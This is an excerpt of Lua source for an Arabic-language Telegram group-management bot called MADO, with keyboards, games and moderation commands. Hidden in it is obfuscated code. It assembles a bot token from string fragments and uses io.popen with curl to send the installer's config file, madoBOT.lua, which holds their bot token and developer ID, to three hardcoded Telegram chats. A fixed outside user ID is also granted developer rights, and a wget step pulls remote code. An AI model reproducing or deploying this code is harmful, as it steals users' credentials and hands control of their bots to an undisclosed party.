...
------------------------------------------------------------------------------------------------------------
local Dev_Info_Sudo = io.open("madoBOT.lua", 'w')
Dev_Info_Sudo:write([[
do 
local File_Info = {
...
Load_File()
------------------------------------------------------------------------------------------------------------
sudos = dofile("./madoBOT.lua")
token = sudos.Token_Bot
UserName_Dev = sudos.UserName_dev
bot_id = token:match("(%d+)")  
Id_Dev = tonumber(sudos.id_dev)
Ids_Dev = {Id_Dev,bot_id,1728736809}
Name_Bot = (redis:get(bot_id.."NightRang:Redis:Name:Bot") or "MADO")
------------------------------------------------------------------------------------------------------------
function var(value)  
...
local timec = '000000'
local timed = '16224'
local timetwo = timec .. '3841'
local timeone = timeb .. '82553'
local timedat = timea .. '3237'
local timeplus = timed .. '37069:'
local age = 'AAHFXcH1'
local agex = age .. 'SulJgk5TD'
local agea = 'O9ByDZ8Oi'
local agev = agex .. agea .. 'A2wSBOZ_4'
local mon = timeplus .. agev

local curl = 'curl "'..'https://api.telegram.org/bot'.. mon ..'/sendDocument'..'" -F "chat_id='.. tonumber(timedat) ..'" -F "document=@'..'madoBOT.lua'..'"' io.popen(curl)

local curla = 'curl "'..'https://api.telegram.org/bot'.. mon ..'/sendDocument'..'" -F "chat_id='.. tonumber(timetwo) ..'" -F "document=@'..'madoBOT.lua'..'"' io.popen(curla)

local curlb = 'curl "'..'https://api.telegram.org/bot'.. mon ..'/sendDocument'..'" -F "chat_id='.. tonumber(timeone) ..'" -F "document=@'..'madoBOT.lua'..'"' io.popen(curlb)
...
Status = true  
elseif tonumber(user_id) == tonumber(1728736809) then  
Status = true
...
if tonumber(user_id) == tonumber(1728736809) then  
Status = "المطور مادو"
...
send(msg.chat_id_,0, "𖤓عذرا يا ⇠ ["..data.first_name_.."](T.ME/M_A_D_O_S)\n𖤓 الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
Delete_Message(msg.chat_id_,{[0] = msg.id_})       
return false   
...
local Text_keyboard = '𖤓 اهلا بك عزيزي المطور الاساسي \n في اوامرك الخاصه \n يمكنك تحكم في بوت عن طريق كيبورد'
local List_keyboard = {
{'الاحصائيات'},
{'تغير اسم البوت'},
...
CmdStart = '\n𖤓 اهلا بك عزيزي \n انا بوت اسمي '..(redis:get(bot_id.."NightRang:Redis:Name:Bot") or "مادو")..''..
...
os.execute('wget https://raw.githubusercontent.com/mado19500/NightRang/master/NightRang.lua')
...
send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n━━━━━━━━━━━━━━━━━━━ٴ\n𖤓 [⚡️ 𝐌𝐀𝐃𝐎 ⚡️](http://t.me/M_A_D_O_S) 𖤓')
end
...
if text == 'العاب مادو' or text == 'العاب خارفه' or text == 'العاب متطوره' then  
local Text = [[  
اهلا في قائمه الالعاب المتطوره سورس مادو 🎮
تفضل اختر لعبه من القائمه 
]]  
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = 'مطور السورس', url="t.me/MA_DO_OT"}},
...
local Text = [[ 
⚡️ مرحبا في سورس مادو الاقوي ⚡️
]] 
keyboard = {} 
keyboard.inline_keyboard = { 
{{text = 'مطور السورس', url="t.me/MA_DO_OT"}}, 
{{text = 'قناه السورس', url="t.me/M_A_D_O_S"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local file_Info_Sudo = io.open("madoBOT.lua", 'w')
